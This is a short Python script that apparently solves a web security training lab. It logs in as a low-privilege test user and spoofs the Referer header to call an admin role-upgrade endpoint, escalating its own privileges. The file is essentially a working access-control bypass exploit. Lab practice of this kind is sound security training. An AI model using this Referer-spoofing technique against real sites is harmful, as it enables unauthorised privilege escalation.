import requests

site = "0a40003b03601a0d80de85cb005b0041.web-security-academy.net"
base_url = f"https://{site}"
s = requests.Session()

# Step 1: Log in as wiener (non-admin)
login = s.post(f"{base_url}/login", data={"username": "wiener", "password": "peter"})
if login.status_code != 200:
    print("[!] Login failed for user wiener.")
    exit(1)

# Step 2: Spoof the Referer and resend the same upgrade GET request
target_url = f"{base_url}/admin-roles?username=wiener&action=upgrade"
headers = {
    "Referer": f"{base_url}/admin"
}

upgrade = s.get(target_url, headers=headers)
print("[*] Sent spoofed upgrade request as wiener.")

# Step 3: Trigger backend solve check
home = s.get(base_url)
if "Congratulations" in home.text:
    print("[✓] Lab solved via Referer header spoof.")
else:
    print("[!] Request sent, but lab not marked as solved.")
